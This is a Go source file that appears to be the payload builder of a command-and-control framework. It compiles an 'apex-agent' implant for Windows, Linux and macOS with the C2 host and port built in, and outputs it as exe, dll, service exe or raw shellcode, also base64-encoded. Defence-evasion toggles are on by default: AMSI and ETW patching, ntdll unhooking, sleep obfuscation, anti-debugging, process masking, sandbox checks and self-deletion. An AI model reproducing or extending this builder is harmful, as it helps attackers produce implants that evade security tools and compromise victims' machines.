package builder

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// ResolveAgentDir finds the agent source directory.
func ResolveAgentDir(explicit string) (string, error) {
	if explicit != "" {
		abs, err := filepath.Abs(explicit)
		if err != nil {
			return "", err
		}
		if _, err := os.Stat(filepath.Join(abs, "main.c")); err == nil {
			return abs, nil
		}
		return "", fmt.Errorf("agent dir %q has no main.c", abs)
	}
	cwd, _ := os.Getwd()
	cwdAgent := filepath.Join(cwd, "agent")
	if _, err := os.Stat(filepath.Join(cwdAgent, "main.c")); err == nil {
		return filepath.Abs(cwdAgent)
	}
	exe, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("cannot get executable path: %w", err)
	}
	exeDir := filepath.Dir(exe)
	for _, rel := range []string{
		filepath.Join(exeDir, "..", "agent"),
		filepath.Join(exeDir, "..", "..", "agent"),
	} {
		if _, err := os.Stat(filepath.Join(rel, "main.c")); err == nil {
			return filepath.Abs(rel)
		}
	}
	return "", fmt.Errorf("agent source not found: need agent/main.c in cwd, next to bin/, or set server.agent_dir in config")
}

// Platform represents the target OS for agent builds.
type Platform string

const (
	PlatformWindows Platform = "windows"
	PlatformLinux   Platform = "linux"
	PlatformMacOS   Platform = "macos"
)

// EvasionOpts holds compile-time evasion toggles (Windows).
type EvasionOpts struct {
	SleepObfuscation bool
	UnhookNtdll      bool
	ETWPatch         bool
	AMSIPatch        bool
}

// PosixEvasionOpts holds compile-time evasion toggles (Linux/macOS).
type PosixEvasionOpts struct {
	AntiDebug    bool
	ProcMask     bool
	SelfDelete   bool
	EnvClean     bool
	SandboxCheck bool
}

func boolToFlag(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

// Build builds the agent for the given platform. Returns output bytes, extension, error.
func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS bool,
	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts) ([]byte, string, error) {

	absDir, err := ResolveAgentDir(agentDir)
	if err != nil {
		return nil, "", err
	}

	host := c2Host
	if host == "" || host == "0.0.0.0" {
		host = "127.0.0.1"
	}
	port := c2Port
	if port <= 0 {
		port = 8080
	}
	https := 0
	if useHTTPS {
		https = 1
	}

	env := append(os.Environ(),
		"C2_HOST="+host,
		fmt.Sprintf("C2_PORT=%d", port),
		fmt.Sprintf("USE_HTTPS=%d", https),
	)

	var makeTarget string
	var outFile string

	switch platform {
	case PlatformLinux:
		pev := PosixEvasionOpts{AntiDebug: true, ProcMask: true, EnvClean: true, SandboxCheck: true}
		if posixEvasion != nil {
			pev = *posixEvasion
		}
		env = append(env,
			"ENABLE_ANTI_DEBUG="+boolToFlag(pev.AntiDebug),
			"ENABLE_PROC_MASK="+boolToFlag(pev.ProcMask),
			"ENABLE_SELF_DELETE="+boolToFlag(pev.SelfDelete),
			"ENABLE_ENV_CLEAN="+boolToFlag(pev.EnvClean),
			"ENABLE_SANDBOX_CHECK="+boolToFlag(pev.SandboxCheck),
		)
		makeTarget = "linux-elf"
		outFile = "agent_linux"

	case PlatformMacOS:
		pev := PosixEvasionOpts{AntiDebug: true, ProcMask: true, EnvClean: true, SandboxCheck: true}
		if posixEvasion != nil {
			pev = *posixEvasion
		}
		env = append(env,
			"ENABLE_ANTI_DEBUG="+boolToFlag(pev.AntiDebug),
			"ENABLE_PROC_MASK="+boolToFlag(pev.ProcMask),
			"ENABLE_SELF_DELETE="+boolToFlag(pev.SelfDelete),
			"ENABLE_ENV_CLEAN="+boolToFlag(pev.EnvClean),
			"ENABLE_SANDBOX_CHECK="+boolToFlag(pev.SandboxCheck),
		)
		makeTarget = "macos-macho"
		outFile = "agent_macos"

	default: // Windows
		ev := EvasionOpts{SleepObfuscation: true, UnhookNtdll: true, ETWPatch: true, AMSIPatch: true}
		if evasion != nil {
			ev = *evasion
		}
		env = append(env,
			"ENABLE_ETW_PATCH="+boolToFlag(ev.ETWPatch),
			"ENABLE_AMSI_PATCH="+boolToFlag(ev.AMSIPatch),
			"ENABLE_SLEEP_ENCRYPT="+boolToFlag(ev.SleepObfuscation),
			"ENABLE_UNHOOK="+boolToFlag(ev.UnhookNtdll),
		)
		switch strings.ToLower(outputFormat) {
		case "exe":
			makeTarget = "exe"
			outFile = "agent.exe"
		case "dll":
			makeTarget = "dll"
			outFile = "agent.dll"
		case "shellcode", "bin":
			makeTarget = "shellcode"
			outFile = "agent.bin"
		case "service_exe":
			makeTarget = "exe"
			outFile = "agent.exe"
		default:
			makeTarget = "exe"
			outFile = "agent.exe"
		}
	}

	cleanCmd := exec.Command("make", "-C", absDir, "clean")
	cleanCmd.Env = env
	cleanCmd.Dir = absDir
	cleanCmd.CombinedOutput()

	cmd := exec.Command("make", "-C", absDir, makeTarget)
	cmd.Env = env
	cmd.Dir = absDir
	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, "", fmt.Errorf("build failed: %w\n%s", err, out)
	}

	outPath := filepath.Join(absDir, outFile)
	data, err := os.ReadFile(outPath)
	if err != nil {
		return nil, "", fmt.Errorf("read built output: %w", err)
	}

	ext := filepath.Ext(outFile)
	if ext == "" {
		ext = ".elf"
		if platform == PlatformMacOS {
			ext = ".macho"
		}
	}
	return data, ext, nil
}

// BuildBase64 builds and returns base64-encoded payload and filename.
func BuildBase64(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS bool,
	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts) (string, string, error) {

	data, ext, err := Build(agentDir, platform, outputFormat, c2Host, c2Port, useHTTPS, evasion, posixEvasion)
	if err != nil {
		return "", "", err
	}
	name := "apex-agent" + ext
	return base64.StdEncoding.EncodeToString(data), name, nil
}
